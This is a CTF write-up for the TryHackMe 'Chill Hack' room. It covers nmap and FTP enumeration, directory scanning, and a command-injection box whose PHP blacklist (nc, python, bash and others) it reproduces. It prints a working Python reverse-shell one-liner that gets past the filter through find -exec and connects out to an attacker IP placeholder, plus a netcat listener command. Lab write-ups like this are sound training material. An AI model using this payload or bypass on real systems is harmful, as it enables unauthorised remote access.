---
title: Chill Hack
summary: TryHackMe boot-to-root room covering FTP enumeration, web command injection, reverse shells, and Linux privilege escalation.
date: 2026-04-08
tags: [TryHackMe, Boot2Root, FTP, Web, Command Injection, Reverse Shell, Privilege Escalation]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/chillhack
---

# CTF Room: Chill Hack
- [Link to room](https://tryhackme.com/room/chillhack)
- **Difficulty:** Easy
- **Category:** Steganography, Web, LFI

## 1. User Flag

### NMAP Scan
```bash
nmap -sV -sC -Pn chillhack.thm
```
```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 15:45 +0100
Nmap scan report for 10.80.174.187
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.157.190
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 79:6b:f7:71:b4:70:7f:ef:83:87:d1:13:28:b9:9a:33 (RSA)
|   256 f5:66:66:8c:b7:52:33:ff:da:86:6f:60:21:35:a4:b5 (ECDSA)
|_  256 3d:d7:b6:34:cc:21:39:3e:bd:0e:d6:95:86:79:6d:4f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.15 seconds

```

As we can see, we have FTP (21) so lets investigate that! I will login as anonymous and see if there is anything valuable to our enumeration in the ftp server!

```text
ftp chillhack.thm
```
```text
❯ ftp 10.80.174.187
Connected to 10.80.174.187.
220 (vsFTPd 3.0.5)
Name (10.80.174.187:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|\|\|29353|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|\|\|34756|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |******************************************************************************************************************************************************************************************************************|    90        0.98 KiB/s    00:00 ETA226 Transfer complete.
90 bytes received in 00:00 (0.77 KiB/s)
ftp>
```

Lets have a look within note.txt.

```text
cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Slightly cryptic, maybe this will make some sense later on, for now lets carry on with the other ports, given 22 and 80 I am inclined to start with port 80.

Having had a quick browse of the site, in peak adam laziness I decided to let feroxbuster have a look around on my behalf :)

```text
feroxbuster --url http://chillhack.thm -s 301
```
```text
❯ feroxbuster --url http://10.80.174.187 -s 301

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.80.174.187/
 🚩  In-Scope Url          │ 10.80.174.187
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [301]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      315c http://10.80.174.187/images => http://10.80.174.187/images/
301      GET        9l       28w      312c http://10.80.174.187/css => http://10.80.174.187/css/
301      GET        9l       28w      311c http://10.80.174.187/js => http://10.80.174.187/js/
301      GET        9l       28w      314c http://10.80.174.187/fonts => http://10.80.174.187/fonts/
301      GET        9l       28w      315c http://10.80.174.187/secret => http://10.80.174.187/secret/
301      GET        9l       28w      322c http://10.80.174.187/secret/images => http://10.80.174.187/secret/images/
[####################] - 23s    60268/60268   0s      found:6       errors:1

```

I used the flag -s 301 just to target the valid subdomains located and shorten the output a tad for the writeup :) I ran it in full without this -s tag initially!

Lets have a look at the /secret/ directory and /secret/images

Navigating to /secret/ I can see a command box, when entering a command, in /secret/images are the source gif's for the result of a command. It is now clear that this text file is actually trying to tell us something about this command box.

It would appear that some commands will be denied and some allowed. Lets try to find a command that is allowed....

I tried all the usual such as:
- ls (no)
- cat (no)
- pwd (yes)
- whoami (yes)
- find (yes... YES)

Using the find command, we can inject a reverse shell into the command box and hopefully spawn a shell, lets try it!

### Set Listener on Kali
```text
nc -lvnp 1337
```

# Revshell via find
```text
find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<kali_ip>",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;
```

This revshell worked, giving us a shell! Lets stabilise this shell now with the following command
### Stabilise tty shell
```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now that we are in, I found index.php in the current working directory, analysing its source code I found the following blacklist...
### Command Blacklist
```text
$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
```
